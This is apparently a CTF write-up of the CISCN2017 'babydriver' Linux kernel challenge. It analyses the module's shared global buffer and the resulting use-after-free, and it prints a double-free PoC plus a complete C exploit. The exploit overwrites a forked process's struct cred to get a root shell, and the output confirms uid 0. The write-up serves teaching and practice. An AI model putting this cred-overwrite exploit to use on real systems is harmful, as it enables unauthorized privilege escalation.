---
layout: post
title: "CISCN2017 - babydriver"
date: 2022-01-18
description: ""
category: 
tags: []
---
* TOC
{:toc}

## CISCN2017 - babydriver

[Attachment](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)

### Check Materials

```
# extract babydriver.tar
$ tar -xvf babydriver.tar
boot.sh
bzImage
rootfs.cpio
$ cat boot.sh
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage \
	-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
	-enable-kvm -monitor /dev/null -m 64M --nographic \
	-smp cores=1,threads=1 -cpu kvm64,+smep
```

This script uses qemu to invoke a virtual machine with only one core and one thread. Meanwhile, `rootfs.cpio` is root filesystem and `bzImage` is the linux kernel. Let's check bzImage and rootfs.cpio to get further information:

```
$ file bzImage
bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 ...
# extract the rootfs.cpio
$ file rootfs.cpio
rootfs.cpio: gzip compressed data ...
$ mkdir core
$ cd core
$ cp ../rootfs.cpio rootfs.cpio.gz
$ gunzip ./rootfs.cpio.gz
rootfs.cpio
$ cpio -idmv < rootfs.cpio
.
etc
etc/init.d
etc/passwd
......
$ ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
$ cat init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

The `insmod` command will insert the kernel module - babydriver.ko. Usually this kernel module contains the designed vulnerability.

### Vulnerability Analysis

Drag the `babydriver.ko` into IDA Pro, and there is one critical data structure, and seven functions - `babydriver_init`, `babydriver_exit`, `babyopen`, `babyrelease`, `babyioctl`, `babyread`, `babywrite`.

```
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
00000010
```

Analysis of `babydriver_init` and `babydriver_exit`:

The init and exit function below will create and destroy one device `/dev/babydev`.

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( (int)alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v1 >= 0 )
    {
      v2 = (class *)_class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
void __cdecl babydriver_exit()
{
  device_destroy(babydev_class, babydev_no);
  class_destroy(babydev_class);
  cdev_del(&cdev_0);
  unregister_chrdev_region(babydev_no, 1LL);
}
```

Analysis of `babyopen`, `babyrelease`:

`babyopen` allocates a device buffer with `kmalloc` and destroy this device buffer with `kfree`.
```
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}
```

Analysis of `babyioctl`

`babyioctl` provides one command - 65537 to reallocate the device_buf with the provided length.
```
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 result; // rax

  _fentry__(filp, command);
  v4 = v3;
  if ( command == 65537 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB);
    result = -22LL;
  }
  return result;
}
```

Analysis of `babyread`, `babywrite`.

`babyread` reads content from `/dev/babydev` to user-space buffer and `babywrite` just does the opposite.
```
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}

ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```

Since the device_buf is in the .bss section, i.e., a global variable, so there is one racy issue - the latter open operation will overwrite the device_buf allocated by the former open operation.

```
   fd 1                  fd 2
   open  <-- allocate device_buf		
                         open  <-- allocate and overwrite device_buf
  release  <-- free the new allocation
                       operation  <-- Use After Free is triggered
                        release   <-- Double Free is triggered
```

### PoC Generation

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	// 释放 fd1
	close(fd1);

	// 释放 fd2, double free is triggered
	close(fd2);

	return 0;
}
```

Let's repackage the rootfs and execute the PoC.

```
$ gcc -static -o poc poc.c
$ cp poc core/tmp/
$ cd core
$ find . | cpio -o --format=newc > rootfs.cpio
$ cp rootfs.cpio ../
$ cd ../
$ ./boot.sh
/ $ /tmp/poc
/ $ /tmp/poc
```

### Vulnerability Exploitation

1. check the protection of kernel module

```
$ checksec babydriver.ko
[*] 'ctf-challenges/pwn/kernel/CISCN2017-babydriver/babydriver.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

2. Exploit Generation with `struct cred` - `poc.c`

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    // 打开两次设备
    int fd1 = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);

    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
    ioctl(fd1, 0x10001, 0xa8);

    // 释放 fd1
    close(fd1);

    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
    int pid = fork();
    if(pid < 0)
    {
        puts("[*] fork error!");
        exit(0);
    }

    else if(pid == 0)
    {
        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
        char zeros[30] = {0};
        write(fd2, zeros, 28);

        if(getuid() == 0)
        {
            puts("[+] root now.");
            system("/bin/sh");
            exit(0);
        }
    }

    else
    {
        wait(NULL);
    }
    close(fd2);

    return 0;
}
```

Let's explain the exploit. At the high level, it allocates one object with struct cred in the freed object and then modify the uid and gid fields with the dangling pointer.

In detail, the exploit is in several steps:
- The second `open` will overwrite the `device_buf` allocated by the first `open`;
- The `ioctl` will reallocate the device_buf with our provided size `0xa8`, i.e., the size of `struct cred`.
- The `close` will free the device_buf and leave device_buf as a dangling pointer;
- The `fork` will allocate one object with `struct cred` and occupy the space pointed by device_buf;
- The `write` will modify the object with `struct cred` and modify the uid and gid fields;

For the implementation of `fork`, let's refer to [the source code of linux kernel 4.4.72](https://elixir.bootlin.com/linux/v4.4.72/source)

First, the definition of struct cred is defined in [include/linux/cred.h](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118)

```
struct cred {
	......
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	......
};
```

Second, the calling sequence of fork system call is as follows:

```
fork (kernel/fork.c#L1819)
  -> _do_fork (kernel/fork.c#L1724)
    -> copy_process (kernel/fork.c#L1268)
      -> copy_creds (kernel/cred.c#L322)
        -> prepare_creds (kernel/cred.c#L243)
          -> kmem_cache_alloc
```

Demonstrate the exploit:

```
$ gcc -static -o exploit exploit.c
$ cp exploit core/tmp/
$ cd core
$ find . | cpio -o --format=newc > rootfs.cpio
$ cp rootfs.cpio ../
$ cd ../
$ ./boot.sh
/ $ cd /tmp/
/tmp $ ls
cred     exploit  poc
/tmp $ ./exploit
[    9.416366] device open
[    9.417081] device open
[    9.417805] alloc done
[    9.418463] device release
[+] root now.
/tmp # id
uid=0(root) gid=0(root) groups=1000(ctf)
```

Now everything is done!

## References

[1] <https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/>    
[2] <https://mask6asok.top/2020/02/06/kernel_challenge.html#2017-CISCN>    

